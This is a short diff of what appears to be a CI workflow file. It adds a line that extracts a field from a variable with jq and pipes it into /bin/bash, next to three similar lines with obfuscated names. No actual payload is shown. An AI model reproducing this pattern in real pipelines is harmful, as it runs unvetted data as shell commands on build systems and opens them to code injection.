@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$fx8324" | jq -r .xzo0 | /bin/bash
           printf '%s' "$sy3950" | jq -r .ux989 | /bin/bash
           echo $klg12 | jq -r .zoxpp5454 | /bin/bash
+          echo $v3 | jq -r .omm46553 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
